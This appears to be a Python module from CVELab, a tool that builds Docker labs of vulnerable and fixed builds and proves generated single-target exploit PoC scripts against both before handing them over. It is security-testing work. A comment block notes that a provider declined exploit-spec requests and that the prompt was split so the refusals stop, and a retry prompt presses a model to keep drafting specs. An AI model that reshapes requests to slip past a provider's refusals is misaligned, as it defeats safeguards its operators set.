    is what a seeding route is, and it is deliberately not part of the script:
    the deliverable CVELab proves has to stay byte for byte the one the
    operator receives.

    A request that cannot be reached at all stops the proof. An unseeded
    instance answers the attack with nothing to show, which is
    indistinguishable from a fixed one, so a silent failure here would report
    the fixed build's own behaviour for both and call it a differential.
    """
    completed = subprocess.run(
        ["docker", *sidecar_argv(
            f"container:{container}",
            image=image,
            program=_SETUP_RUNNER,
            flags=runtime_flags(),
            environment={
                "CVELAB_BASE": f"http://{host}:{port}",
                "CVELAB_SETUP": json.dumps(requests),
                "CVELAB_INPUTS": json.dumps(inputs or {}),
            },
        )],
        capture_output=True, text=True, timeout=300, check=False,
    )
    tail = completed.stdout.strip().splitlines()[-1:] or [""]
    try:
        reported = json.loads(tail[0])
    except json.JSONDecodeError:
        reported = None
    if completed.returncode != 0:
        detail = reported if reported is not None else (
            completed.stderr or completed.stdout
        ).strip()[-600:]
        raise RuntimeError(f"setup did not run against this build: {detail}")
    if not isinstance(reported, dict):
        return {"requests": [], "bound": {}}
    return {
        "requests": reported.get("requests") or [],
        # Read from this build during this run, for this proof only: the
        # shipped script asks the operator for their own.
        "bound": {
            str(name): str(value)
            for name, value in (reported.get("bound") or {}).items()
        },
    }


def _run_field_script(
    container: str, port: int, script: str, transport: str = "http",
    image: str = sidecar.BASE_IMAGE, inputs: dict[str, str] | None = None,
    host: str = "127.0.0.1", disruptive: bool = False,
) -> dict[str, Any]:
    """Run the emitted field PoC from a sidecar sharing the lab's network.

    The deliverable has no loopback guard, so the same script CVELab validates
    is the one the operator receives. The sidecar joins the lab container's
    network namespace, so --target 127.0.0.1 reaches the product with nothing
    published to the host.
    """
    # The inputs travel as one JSON environment value rather than as argv,
    # so a credential does not sit in the sidecar's command line. A spec that
    # declares one cannot be proved without it: the run refuses to start and
    # the proof would record silence that only meant the script never looked.
    bootstrap = (
        "import json, os, pathlib, runpy, sys\n"
        "home = pathlib.Path('/tmp/cvelab'); home.mkdir(parents=True, exist_ok=True)\n"
        "(home / 'field.py').write_text(os.environ['CVELAB_FIELD'])\n"
        "given = json.loads(os.environ.get('CVELAB_INPUTS') or '{}')\n"
        "sys.argv = ['field.py', '--target', os.environ['CVELAB_BASE'], '--json']\n"
        # A service_crash script refuses to run without this, which is the
        # point of the flag. Here the target is a container of the lab's own,
        # built to be crashed and thrown away, so the acknowledgement the
        # operator makes by typing it is one CVELab can make for itself.
        + ("sys.argv.append('--allow-disruption')\n" if disruptive else "")
        + "for name, value in given.items():\n"
        "    sys.argv += ['--input', '%s=%s' % (name, value)]\n"
        "runpy.run_path(str(home / 'field.py'), run_name='__main__')\n"
    )
    completed = subprocess.run(
        ["docker", *sidecar_argv(
            f"container:{container}",
            image=image,
            program=bootstrap,
            flags=runtime_flags(),
            environment={
                # A socket PoC takes a host and a port and refuses a URL, so
                # the form the sidecar passes has to follow the spec's
                # transport.
                "CVELAB_BASE": (
                    f"http://{host}:{port}" if transport == "http" else f"{host}:{port}"
                ),
                "CVELAB_FIELD": script,
                "CVELAB_INPUTS": json.dumps(inputs or {}),
            },
        )],
        capture_output=True, text=True, timeout=300, check=False,
    )
    verdict = completed.stdout.strip().splitlines()[-1:] or [""]
    observation: dict[str, Any] = {}
    for line in completed.stdout.splitlines():
        line = line.strip()
        if line.startswith("{") and line.endswith("}"):
            with contextlib.suppress(json.JSONDecodeError):
                observation = json.loads(line)
    # The script reports one of two verdicts and exits 0 or 1 to match. Any
    # other ending -- a traceback, an unreachable target, a killed sidecar --
    # is neither, and reading only "is the last line OBSERVED" called it
    # silence: a crash against the fixed image proved the fix.
    ran = verdict[0] in ("OBSERVED", "NOT_OBSERVED") and completed.returncode in (0, 1)
    return {
        "observed": ran and verdict[0] == "OBSERVED",
        "ran": ran,
        "verdict": verdict[0] if ran else None,
        "exit_code": completed.returncode,
        "observation": observation,
        "output": completed.stdout[-_MAX_FIELD_OUTPUT:],
        "stderr": completed.stderr.strip()[-2000:],
    }


def _run_variant(
    cve: str, variant: str, image: str, port: int, health_path: str,
    spec: dict[str, Any], script: str,
) -> dict[str, Any]:
    """Start one image, seed it, and run the field PoC against it.

    The starting, seeding and taking away is `disposable_instance`, which the
    closed path uses for the same thing on the same kind of input: a pair of
    published images. `field-` stays in the container's name so an operator
    reading `docker ps` can tell the two modes apart.

    It brought the health wait and the fixture with it, which is why
    `_apply_fixture` and `_wait_ready` are no longer imported here -- this
    module no longer does either by hand. `_validate_fixture` still is: a
    spec's fixture is checked when the spec is read, long before anything is
    started.
    """
    with disposable_instance(
        cve, variant, image, port, health_path, spec, prefix="cvelab-field"
    ) as running:
        outcome = _run_field_script(
            running.container, port, script, spec.get("transport", "http"),
            sidecar.ensure_image({spec.get("transport", "http")}, True),
        )
        return {
            "variant": variant, "image": image, "fixture": running.fixture, **outcome
        }


def run_field_lab(
    cve: str,
    output_root: Path,
    vulnerable_image: str,
    fixed_image: str | None,
    container_port: int,
    health_path: str,
    spec_path: Path,
) -> dict[str, Any]:
    """Emit a field PoC and prove it against the built instances.

    A field PoC without a fixed instance to check against cannot show that the
    effect it observes is the vulnerability rather than the application's normal
    behavior, so a fixed image is required here even though the closed mode
    treats it as optional.
    """
    cve = check_lab_arguments(cve, container_port, health_path)
    if not fixed_image:
        raise ValueError("field mode needs a fixed image to prove the effect is the bug")
    spec = validate_spec(json.loads(spec_path.read_text(encoding="utf-8")))
    script = emit_standalone_poc(cve, spec, port=container_port)

    lab_dir = output_root.resolve() / cve
    artifacts = lab_dir / "artifacts"
    evidence_dir = lab_dir / "field" / "evidence"
    artifacts.mkdir(parents=True, exist_ok=True)
    evidence_dir.mkdir(parents=True, exist_ok=True)

    vulnerable = _run_variant(
        cve, "vulnerable", vulnerable_image, container_port, health_path, spec, script
    )
    patched = _run_variant(
        cve, "patched", fixed_image, container_port, health_path, spec, script
    )

    # The script is a field PoC only if it tells the two apart on its own: the
    # effect on the vulnerable instance, silence on the fixed one. Firing on
    # both means it observes normal behavior, not the bug. Silence counts only
    # from a run that finished and said so -- a script that crashed against
    # the fixed image observed nothing because it never looked.
    both_ran = bool(vulnerable["ran"] and patched["ran"])
    proven = bool(both_ran and vulnerable["observed"] and not patched["observed"])
    proof_checks = {
        "script_ran_on_both": both_ran,
        "effect_observed_on_vulnerable": bool(vulnerable["observed"]),
        "silent_on_fixed": bool(patched["ran"] and not patched["observed"]),
        "field_poc_proven": proven,
    }

    (artifacts / "field-poc.py").write_text(script, encoding="utf-8")
    (artifacts / "field-poc.py").chmod(0o755)
    (artifacts / "field-spec.json").write_text(
        json.dumps(spec, indent=2), encoding="utf-8"
    )

    plan = {
        "cve": cve,
        "lab_type": "FIELD_POC",
        "strategy": spec["strategy"],
        "repository": None,
        "revisions": {},
        "images": {"vulnerable": vulnerable_image, "patched": fixed_image},
        "container_port": container_port,
        "health_path": health_path,
    }
    evidence = {
        "schema_version": 1,
        "cve": cve,
        "status": "REAL_FIELD_POC_VALIDATED" if proven else "FIELD_POC_NOT_VALIDATED",
        "lab_type": "FIELD_POC",
        "strategy": spec["strategy"],
        "observable_effect": spec["observable_effect"],
        "validated_against": {"vulnerable": vulnerable_image, "fixed": fixed_image},
        "proof_checks": proof_checks,
        "runs": {"vulnerable": vulnerable, "patched": patched},
    }
    (lab_dir / "plan.json").write_text(json.dumps(plan, indent=2), encoding="utf-8")
    (artifacts / "plan.json").write_text(json.dumps(plan, indent=2), encoding="utf-8")
    (artifacts / "EVIDENCE.json").write_text(json.dumps(evidence, indent=2), encoding="utf-8")
    (evidence_dir / "result.json").write_text(json.dumps(evidence, indent=2), encoding="utf-8")

    usage = "python3 field-poc.py --target 10.0.0.5:8080 --show-bodies"
    walkthrough = f"""# {cve} Field PoC

## What this is

A single-target exploit you run yourself, against one server you are permitted
to test, in one run. It shows the vulnerability happening: {spec['observable_effect']}

It does not need a second server. Its proof is an effect a fixed build cannot
produce, and CVELab confirmed that before handing it to you -- the script
observed the effect on `{vulnerable_image}` and stayed silent on `{fixed_image}`.

## Run it

```bash
cd {cve}/artifacts
{usage}
```

`--target` is one host and port: `10.0.0.5:8080`, `[2001:db8::1]:8443` or
`https://app.example.com`. A scheme is optional and `http` is assumed without
one, except for port 443. The paths come from the spec, so the target carries
none.

It prints `OBSERVED` and exits 0 when the effect is present, `NOT_OBSERVED` and
exits 1 when it is not. Any other ending is a run that did not finish, not a
result. Without `--show-bodies` each disclosed value is cut at 120 characters;
with it they print in full, which is what a report needs as evidence.

The script names the target and the effect on stderr before it sends anything,
so the run is visible in the output and in whatever log captured it. It sends
live requests and reads what comes back, so point it only at a host the
engagement covers, and keep that permission in writing -- the effect it
demonstrates is real data leaving a real server.

## Strategy: {spec['strategy']}

{'It reads the same resource two ways in one request round -- the vulnerable path and the path that authorizes correctly -- and reports what only the vulnerable path returned. A value it reports is one the server disclosed to an unauthorized requester.' if spec['strategy'] == 'inband_differential' else 'It sends a unique marker through the vulnerable vector and observes it surface where it should not. The marker is fresh each run, so a stored reflection from a previous run is never counted.'}

## A negative result is not always a clean bill

`NOT_OBSERVED` means the effect was not seen on this target with this input. For
a differential strategy it can also mean the target had nothing for the probe to
disclose -- an empty instance -- not that it is patched. To decide affected vs
fixed regardless of data, check the build, not only this script.
"""
    report = f"""# {cve} Field PoC Report

- Lab type: `FIELD_POC`
- Strategy: `{spec['strategy']}`
- Observable effect: {spec['observable_effect']}
- Proven against vulnerable `{vulnerable_image}`: `{vulnerable['observed']}`
- Silent against fixed `{fixed_image}`: `{not patched['observed']}`
- Field PoC proven: `{proven}`

## Interpretation

The script is handed over only because it told the vulnerable and the fixed
instance apart on its own. It claims only the effect it observed; it does not
infer source-level root cause or behavior outside the requests it sends.
"""
    (artifacts / "WALKTHROUGH.md").write_text(walkthrough, encoding="utf-8")
    (artifacts / "REPORT.md").write_text(report, encoding="utf-8")
    (artifacts / "report.json").write_text(
        json.dumps({"cve": cve, "lab_type": "FIELD_POC", "ok": proven,
                    "real_poc_verified": proven, "proof_checks": proof_checks},
                   indent=2), encoding="utf-8"
    )

    result = {
        "ok": proven,
        "cve": cve,
        "lab_type": "FIELD_POC",
        "strategy": spec["strategy"],
        "field_poc_proven": proven,
        "proof_checks": proof_checks,
        "vulnerable": vulnerable,
        "patched": patched,
        "lab_dir": str(lab_dir),
        "deliverables": {
            "field_poc": str(artifacts / "field-poc.py"),
            "spec": str(artifacts / "field-spec.json"),
            "evidence": str(evidence_dir / "result.json"),
            "walkthrough": str(artifacts / "WALKTHROUGH.md"),
            "report": str(artifacts / "REPORT.md"),
        },
    }
    return result


# --- A source lab's handover -------------------------------------------------
#
# `cvelab field` above needs a pair of published images: what a closed product
# ships and a source lab has no equivalent of, because it builds its two
# revisions itself. Everything below gives a source lab the same deliverable
# from the two builds it already has.
#
# The spec is the operator's, not the model's. Asking for one during generation
# pushed the whole generation prompt past the provider's threshold: two of three
# CVEs that had validated minutes earlier with the same model came back
# PROVIDER_DECLINED, which costs the lab rather than only the extra. It is also
# the better division of labour -- the operator holds the engagement and knows
# what may be tested, and only a minority of effects can be shown over HTTP
# from one host at all. CVELab keeps the half worth automating: proving the
# script against both builds before it is handed over.

def _lab_plan(lab_dir: Path) -> dict[str, Any]:
    """The lab's own plan, or a refusal naming what is not there."""
    plan_path = lab_dir / "plan.json"
    if not plan_path.exists():
        raise RuntimeError(f"No lab in {lab_dir}: plan.json is missing")
    try:
        plan = json.loads(plan_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as error:
        raise RuntimeError(f"{plan_path} is not readable: {error}") from error
    if not isinstance(plan, dict):
        raise RuntimeError(f"{plan_path} is not a lab plan")
    return plan


def _require_reproduced(lab_dir: Path) -> None:
    """Refuse a lab whose own differential never held.

    The emitted script is held to the differential bar itself -- the effect on
    the vulnerable build, silence on the fixed one -- but a lab that never
    reproduced has no demonstrated effect to hand over in the first place, and
    a script that fires against it is showing something else.
    """
    report_path = lab_dir / "report.json"
    if not report_path.exists():
        raise RuntimeError(
            f"{lab_dir.name} has not been validated: run `cvelab run {lab_dir.name}` first"
        )
    try:
        report = json.loads(report_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as error:
        raise RuntimeError(f"{report_path} is not readable: {error}") from error
    if not (isinstance(report, dict) and report.get("real_poc_verified") is True):
        raise RuntimeError(
            f"{lab_dir.name} did not reproduce, so it has no demonstrated effect to hand "
            "over; a single-target script is written only for a lab whose own "
            "differential held"
        )


def _seal_lab(compose: list[str], lab_dir: Path, environment: dict[str, str]) -> None:
    """Put the lab back the way it was found: nothing running, nothing kept.

    The volumes and the orphans are not optional and that is why this has a
    name. `down` on its own leaves the lab's volumes behind, and a later run
    of the same lab would then start against state this one created -- which
    for a seeding step is exactly the difference between a lab that was put
    in the state the attack needs and one that was already in it. The two
    paths that end a run, the proof's own teardown and `demo-target down`,
    were spelling the same four arguments out separately.
    """
    subprocess.run(
        compose + ["down", "--volumes", "--remove-orphans"],
        cwd=lab_dir,
        env=environment,
    )


def _resolved_compose(
    compose: list[str], lab_dir: Path, environment: dict[str, str]
) -> dict[str, Any]:
    """Compose's own resolution of the lab, which the file may not state plainly."""
    shown = subprocess.run(
        compose + ["config", "--format", "json"],
        cwd=lab_dir,
        capture_output=True,
        text=True,
        env=environment,
    )
    if shown.returncode != 0:
        return {}
    with contextlib.suppress(json.JSONDecodeError):
        resolved = json.loads(shown.stdout)
        if isinstance(resolved, dict):
            return resolved
    return {}


def _service_container(
    compose: list[str], service: str, lab_dir: Path, environment: dict[str, str]
) -> str:
    """The running container id for one Compose service, or "" if it has none."""
    found = subprocess.run(
        compose + ["ps", "-q", service],
        cwd=lab_dir,
        capture_output=True,
        text=True,
        env=environment,
    )
    if found.returncode != 0:
        return ""
    return found.stdout.strip().splitlines()[0].strip() if found.stdout.strip() else ""


_PORT_READY = (
    "import socket, sys, time\n"
    "port, deadline = int(sys.argv[1]), time.monotonic() + float(sys.argv[2])\n"
    "hosts = sys.argv[3:] or ['127.0.0.1']\n"
    "while time.monotonic() < deadline:\n"
    "    for host in hosts:\n"
    "        try:\n"
    "            socket.create_connection((host, port), timeout=3).close()\n"
    "            print(host)\n"
    "            raise SystemExit(0)\n"
    "        except OSError:\n"
    "            pass\n"
    "    time.sleep(2)\n"
    "raise SystemExit(1)\n"
)


#: How long a service with no declared healthcheck is given to open its port.
#: Measured against the thing that broke: a Storybook lab validated through
#: its validator's own retry loop and then failed the manual proof's 240s
#: probe, reported as "pass --container-port", which was not the problem.
_SLOW_START_TIMEOUT = 600


def _is_running(container: str) -> bool:
    completed = subprocess.run(
        ["docker", "inspect", "--format", "{{.State.Running}}", container],
        capture_output=True, text=True, timeout=30, check=False,
    )
    return completed.stdout.strip() == "true"


def _reachable_address(container: str, port: int, timeout: int) -> str:
    """Where this container answers, as the sidecar beside it reaches it.

    For a lab that declares no healthcheck, where `up --wait` returns as soon
    as the container is running and a probe would then race the application's
    own startup.

    Loopback is tried first and is what nearly everything answers on. A
    service that binds its own interface address instead is reached at that
    address, which the sidecar shares the namespace for: Storybook 10.6.1
    listens on 172.18.0.2:6006 and refuses 127.0.0.1, so a probe that only
    knew loopback waited ten minutes and then called a running, listening
    service dead. Returns the address, or "" when nothing answered.
    """
    hosts = ["127.0.0.1", *(a for a in _container_address(container).split() if a)]
    completed = subprocess.run(
        ["docker", *sidecar_argv(
            f"container:{container}",
            image="python:3.13-alpine",
            program=_PORT_READY,
            flags=runtime_flags(),
            arguments=[str(port), str(timeout), *hosts],
        )],
        capture_output=True, text=True, timeout=timeout + 60, check=False,
    )
    if completed.returncode != 0:
        return ""
    answered = completed.stdout.strip().splitlines()[-1:] or [""]
    return answered[0].strip() or "127.0.0.1"


def _still_serving(container: str, port: int) -> str:
    """Where this container is still answering, or "" if it is not.

    Two questions, because they fail differently: a container that exited and
    one that is running but no longer listening both ruin a proof, and both
    used to arrive as an unreachable target minutes later. The address comes
    back with the answer, because the script and the setup have to be pointed
    at whatever the service actually bound.
    """
    state = _docker("inspect", "--format", "{{.State.Running}}", container, check=False)
    if state.strip().lower() != "true":
        return ""
    return _reachable_address(container, port, 15)


#: Terminal colour and cursor control. A dev server writes plenty of it, and
#: the first time these logs were read for a real stop they were almost
#: entirely escape codes with the one useful line buried in them.
_ANSI = re.compile(r"\x1b\[[0-9;]*[A-Za-z]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)")


def _container_logs(container: str, limit: int = 2000) -> str:
    """The tail of what the service said, for a stop that needs explaining."""
    shown = _docker("logs", "--tail", "40", container, check=False)
    plain = _ANSI.sub("", shown)
    # Blank lines left behind by stripped colour runs carry nothing.
    plain = "\n".join(line.rstrip() for line in plain.splitlines() if line.strip())
    return plain[-limit:]


def _bring_up(
    services: list[str],
    probe: list[str],
    port: int,
    timeout: int,
    lab_dir: Path,
    compose: list[str],
    docker: str,
    environment: dict[str, str],
    resolved: dict[str, Any],
) -> None:
    """Build and start the named services, and wait until they are ready.

    `up --wait` holds for a healthcheck to pass, which is the lab's own
    statement of what ready means and what its validator waits on too. It is
    used only when every started service declares one, because `--wait` treats
    a service that merely runs as ready; otherwise each service about to be
    probed is waited on by its port instead.
    """
    definitions = resolved.get("services") or {}
    health_checked = [
        name for name in services
        if isinstance(definitions.get(name), dict) and definitions[name].get("healthcheck")
    ]
    with progress.stage("building lab images"):
        run_docker_stage(
            compose + ["build", *build_limits(), *services],
            stage="build", docker=docker, environment=environment, cwd=lab_dir,
        )
    waited = len(health_checked) == len(services)
    with progress.stage("starting lab services"):
        run_docker_stage(
            compose + [
                "up", "-d",
                *(["--wait", "--wait-timeout", str(timeout)] if waited else []),
                *services,
            ],
            stage="startup", docker=docker, environment=environment, cwd=lab_dir,
        )
    if waited:
        return
    # A lab that declares no healthcheck says nothing about how long its
    # application takes, and its own validator does not have to: it retries in
    # a loop of its own, which is why a lab can validate and then fail here.
    # Storybook took longer than four minutes to serve 6006, and the proof
    # reported it as a wrong port. Waiting longer costs nothing when the
    # service does come up, and the cause is named when it does not.
    patience = max(timeout, _SLOW_START_TIMEOUT)
    for name in probe:
        container = _service_container(compose, name, lab_dir, environment)
        if not container:
            raise RuntimeError(f"{name} did not start")
        if not _reachable_address(container, port, patience):
            running = _is_running(container)
            raise RuntimeError(
                f"{name} did not answer on port {port} within {patience}s, and its "
                + ("container is still running, so either the application is slower "
                   "than that or it listens on another port"
                   if running else "container is no longer running")
                + f". Its last output was:\n{_container_logs(container)}"
            )


def prove_manual_poc(
    cve: str,
    spec: dict[str, Any],
    port: int,
    lab_dir: Path,
    compose: list[str],
    environment: dict[str, str],
    plan: dict[str, Any] | None = None,
    assume_yes: bool = False,
    inputs: dict[str, str] | None = None,
) -> dict[str, Any]:
    """Emit the artifact and say whether remote mode earned the handover.

    The lab's own proof is the differential between two builds it controls,
    and that proof cannot leave the lab: lab mode is the validator, bound to
    the service names, and contract-checked to reach no other host. Remote
    mode is the other claim, and where there are two builds it is held to the
    same bar -- the effect against the vulnerable one, silence against the
    fixed one. A script that fires on both is watching normal behaviour rather
    than the bug; one that crashed observed nothing because it never looked.

    A lab with no fixed build is not refused. A patched build answers one
    question -- is this the bug or is it how the thing always behaves -- and it
    is a check against self-deception, not what makes a vulnerability real. A
    strategy in SELF_CONTROLLED answers that question inside the one instance
    it runs against, so such a lab may hand over a script using one of those.
    direct_observation may not: its only check was the fixed build, and
    "the route answered 200" on its own is the shape of proof that passed a
    lab on `existsSync` seeing a path with "..".

    The script is run from a sidecar joined to each service container's network
    namespace, so `--target 127.0.0.1` reaches the product although the lab
    publishes no port and its network is internal, and the script CVELab proves
    is byte for byte the one the operator receives. That is why the whole
    merged file is proved rather than remote mode on its own: the artifact the
    operator runs carries this lab's validator under it, and a validator whose
    syntax the interpreter cannot parse would make the file unrunnable without
    anything here noticing. Lab mode is not reached -- the sidecar passes a
    target, which the dispatch answers before the lower half is executed.

    Returns the outcome, carrying the script text under "script" when it
    passed. Nothing here raises: the caller records the outcome either way.
    """
    try:
        # Before anything is probed: a handshake transport needs a library in
        # the sidecar, which cannot be fetched once it is in the lab's
        # internal network, and building it is the operator's to agree to.
        will_bind = {
            str(step["bind"]) for step in spec.get("setup") or [] if "bind" in step
        }
        missing = [
            name for name in spec.get("inputs") or ()
            if name not in (inputs or {}) and name not in will_bind
        ]
        if missing:
            # Said before anything is built: without these the script refuses
            # to start, and the proof would read that as the effect being absent.
            return {
                "shipped": False,
                "reason": "this spec needs values only you have: "
                          + ", ".join(missing)
                          + ". Pass each as --input NAME=VALUE",
            }
        vulnerable_only = (plan or {}).get("lab_type") == "VULNERABLE_ONLY_REPRODUCTION"
        if vulnerable_only and spec["strategy"] not in SELF_CONTROLLED:
            return {
                "shipped": False,
                "spec_at_fault": True,
                "reason": f"{spec['strategy']} has no control of its own, and this lab has "
                          f"no fixed build to supply one; use one of "
                          f"{', '.join(SELF_CONTROLLED)}",
            }
        image = sidecar.ensure_image({spec.get("transport", "http")}, assume_yes)
        script = emit_poc(
            cve, plan, _lab_validator(lab_dir),
            {"shipped": True, "spec": spec, "container_port": port},
        )
        wanted = ("vulnerable",) if vulnerable_only else ("vulnerable", "patched")
        containers = {
            name: _service_container(compose, name, lab_dir, environment)
            for name in wanted
        }
        missing = [name for name, cid in containers.items() if not cid]
        if missing:
            return {"shipped": False, "reason": f"no running container for {', '.join(missing)}"}
        # Checked again here, not only at startup. A service can answer the
        # readiness probe and then stop before its turn comes: Storybook
        # 10.6.1 did exactly that, twice, while the fixed build served both
        # runs, and the proof reported "did not finish against both builds" --
        # true, and useless. A service that went away is named.
        runs = {}
        seeded: dict[str, Any] = {}
        for name, cid in containers.items():
            where = _still_serving(cid, port)
            if not where:
                return {
                    "shipped": False,
                    "reason": f"the {name} service stopped answering on port {port} "
                              "before the script ran, so nothing was observed against it",
                    "service_logs": {name: _container_logs(cid)},
                }
            filled = dict(inputs or {})
            if spec.get("setup"):
                applied = _run_setup(cid, port, spec["setup"], image, filled, where)
                # A value setup read from this build fills an input the
                # operator would supply themselves, for this proof only. Their
                # own --input still wins, because a lab secret is no reason to
                # ignore what they passed.
                filled = dict(applied.pop("bound", {}), **filled)
                seeded[name] = applied
            runs[name] = _run_field_script(
                cid, port, script, spec.get("transport", "http"), image, filled, where,
                disruptive=spec["strategy"] == "service_crash",
            )
    except Exception as error:  # noqa: BLE001 - the outcome is the report
        return {"shipped": False, "reason": f"{type(error).__name__}: {error}"[:600]}

    vulnerable = runs["vulnerable"]
    patched = runs.get("patched")
    if patched is None:
        # No fixed build to go silent against, so the strategy's own control
        # is the check. It was required to be one that has one.
        both_ran = bool(vulnerable["ran"])
        proven = bool(both_ran and vulnerable["observed"])
        checks = {
            "script_ran": both_ran,
            "effect_observed_on_vulnerable": bool(vulnerable["observed"]),
            "control_is_in_the_strategy": True,
            "manual_poc_proven": proven,
        }
    else:
        both_ran = bool(vulnerable["ran"] and patched["ran"])
        proven = bool(both_ran and vulnerable["observed"] and not patched["observed"])
        checks = {
            "script_ran_on_both": both_ran,
            "effect_observed_on_vulnerable": bool(vulnerable["observed"]),
            "silent_on_fixed": bool(patched["ran"] and not patched["observed"]),
            "manual_poc_proven": proven,
        }
    outcome: dict[str, Any] = {
        "shipped": proven,
        "strategy": spec["strategy"],
        "observable_effect": spec["observable_effect"],
        "container_port": port,
        "fixed_build_compared": patched is not None,
        # Said out loud wherever the outcome is read: the script was proved
        # against instances CVELab put into a state first, and the operator's
        # target has to be in that state too.
        **({"setup_applied": seeded} if seeded else {}),
        "proof_checks": checks,
        "runs": {
            name: {key: run[key] for key in ("observed", "ran", "verdict", "exit_code")}
            for name, run in runs.items()
        },
    }
    if proven:
        outcome["script"] = script
        return outcome
    if patched is None:
        outcome["reason"] = (
            "the script did not observe the effect on the vulnerable build"
            if both_ran else "the script did not finish"
        )
    elif both_ran and spec["strategy"] == "oob_callback" and not (
        vulnerable["observed"] or patched["observed"]
    ):
        # Said in its own words, because for this strategy "did not tell them
        # apart" means one specific thing: the script listened and nothing
        # ever knocked. On the lab that prompted this, nothing could have --
        # it recorded outbound HTTP in process instead of sending it.
        outcome["reason"] = (
            "nothing reached the script's own listener from either build, so the target "
            "never made the outbound request the payload asked for -- check whether this "
            "lab sends outbound traffic at all"
        )
    else:
        outcome["reason"] = (
            "the script did not tell the two builds apart"
            if both_ran
            else "the script did not finish against both builds"
        )
    # The script ran and the finding is known to be real, so what was wrong
    # is in the spec: the caller may ask for another one. Dropped from the
    # outcome before it is recorded, being this call's business and not the
    # report's.
    outcome["spec_at_fault"] = True
    # Kept because a spec that was refused is only fixable if the run that
    # refused it is visible: a generic reason sends the operator back to guess.
    outcome["output"] = {
        name: {"stderr": run["stderr"], "tail": run["output"][-2000:]}
        for name, run in runs.items()
    }
    return outcome


def _spec_complaint(outcome: dict[str, Any]) -> str:
    """What to tell the next draft about the spec that just failed.

    The reason alone ("did not tell the two builds apart") is not enough to
    write a different spec with: what the script printed is, because it shows
    whether it reached the service at all and what came back when it did.
    """
    lines = [
        "A spec you gave for this same finding was emitted as a script and run "
        f"against the lab's own builds. It failed: {outcome.get('reason')}.",
    ]
    for name, run in (outcome.get("output") or {}).items():
        said = " ".join(
            part.strip() for part in (run.get("stderr", ""), run.get("tail", "")) if part
        )
        lines.append(f"Against the {name} build it printed: {said[-600:]}")
    if "nothing to test on this target" in json.dumps(outcome.get("output") or {}):
        # The discovery chain came back empty, which on these builds means the
        # instance holds nothing of the kind the spec went looking for. Said
        # outright, because the first two specs that hit this were correct and
        # the next draft repeated them unchanged.
        lines.append(
            "A discovery step found nothing, so this instance holds no object of the "
            "kind the spec looked for: the lab is empty except for what its own "
            "validator seeds before attacking. Put those same seeding calls in setup, "
            "and keep the discovery step -- it is what makes the script work against a "
            "real target, which does hold such objects."
        )
    lines.append(
        "The effect is real -- the lab's own validator proves it -- so the spec was "
        "wrong, not the finding. Check the request path, the port, the protocol "
        "framing and what the expectation matches on, and give a different spec. "
        "Answer feasible=false only if you now judge the effect genuinely "
        "unobservable from one instance."
    )
    return "\n".join(lines)


def _prove_drafted_spec(
    cve: str,
    plan: dict[str, Any],
    drafted: dict[str, Any],
    lab_dir: Path,
    compose: list[str],
    environment: dict[str, str],
    assume_yes: bool,
    inputs: dict[str, str] | None,
    *,
    api_key: str | None,
    model: str | None,
    provider: str | None,
    base_url: str | None,
    before_each: Callable[[int], None] | None = None,
) -> tuple[dict[str, Any], int, dict[str, Any]]:
    """Prove a drafted spec, asking for another one if the spec was at fault.

    A drafted spec is sampled, so a refusal is not always the lab's answer.
    Centrifugo reproduced its forged-header bypass on one build and rejected
    it on the other, and the first spec drawn for it found nothing on either:
    asked again, for the same lab, the same finding and the same model, the
    second named the WebSocket path the service actually serves and proved it.
    Without this, that demonstration was lost to one sample.

    Only a failure the spec could have caused is retried. A service that
    stopped, a value only the operator has, or a sidecar that could not be
    built would sample a new answer against the same unchanged obstacle, so
    those come back as they are. An operator's own spec is never retried
    either: it is theirs to correct, and this is only called for drafts.
    """
    spec, port = drafted["spec"], drafted["container_port"]
    offered = drafted.get("lab_values") or {}
    outcome: dict[str, Any] = {}
    for remaining in range(_draft_retries(), -1, -1):
        if before_each is not None:
            before_each(port)
        progress.step("proving the single-target script against both builds")
        # The operator's own values win: these are only what the lab knows,
        # and the script takes them at run time either way.
        outcome = prove_manual_poc(
            cve, spec, port, lab_dir, compose, environment, plan, assume_yes,
            dict(offered, **(inputs or {})),
        )
        at_fault = bool(outcome.pop("spec_at_fault", False))
        if outcome["shipped"] or not at_fault or not remaining:
            if offered:
                # Kept for the record, which is read back when the same lab is
                # asked again: a spec that needed them once needs them again,
                # and nothing else remembers what the lab's own values were.
                outcome["lab_values"] = dict(offered)
            return spec, port, outcome
        progress.step(f"the spec did not hold up, asking for another: {outcome['reason']}")
        again = draft_manual_poc_spec(
            cve, plan, api_key=api_key, model=model, provider=provider,
            base_url=base_url, lab_dir=lab_dir, complaint=_spec_complaint(outcome),
        )
        if "spec" not in again:
            # The second answer is a judgement about the finding, not a run
            # against it. The failure that was measured is the better record,
            # and it was measured with these values.
            if offered:
                outcome["lab_values"] = dict(offered)
            return spec, port, outcome
        spec, port = again["spec"], again["container_port"]
        offered = again.get("lab_values") or {}
    return spec, port, outcome


def _read_json(path: Path) -> dict[str, Any]:
    """One JSON object off disk, or nothing. A missing file is not an error."""
    if not path.is_file():
        return {}
    try:
        held = json.loads(path.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return {}
    return held if isinstance(held, dict) else {}


def poc_record(lab_dir: Path, report: dict[str, Any] | None = None) -> dict[str, Any]:
    """What the drafter's attempt left behind, wherever it is on record.

    `report.manual_poc_field` is where it lives: report.json is in
    `upload.ALWAYS` and in `upload.REQUIRED_TO_SHARE`, so for the first time
    the record travels with the lab and `cvelab manual` on a downloaded
    one reuses what was proved instead of drafting afresh -- a model call and
    a sampled answer, which is how the same lab came to get different
    verdicts on different days. `Manual-PoC.json` could never do that: it was
    deliberately withheld from the corpus.

    The old record is still read, never written. 45 of the archived labs hold
    one and 29 of those carry a proved spec, and this key did not carry a
    spec until the merge, so re-rendering such a lab without reading the file
    beside it would turn a proved remote mode into a refusal. This run's
    answer wins where the two disagree, and the spec comes from whichever has
    one.
    """
    legacy = _read_json(lab_dir / "artifacts" / LEGACY_MANUAL_POC_RECORD_NAME)
    if report is None:
        report = _read_json(lab_dir / "report.json")
    held = report.get("manual_poc_field")
    held = held if isinstance(held, dict) else {}
    return {**legacy, **held}


def _lab_validator(lab_dir: Path) -> str:
    """This lab's own validator, which is lab mode.

    Taken from `validator/validator.py`, the file the validator image runs,
    so the two cannot differ. A lab whose validator directory is not beside
    it -- one re-rendered from a kit, since `validator/` is not among the
    documents that travel -- keeps whatever lab mode its own `PoC.py` already
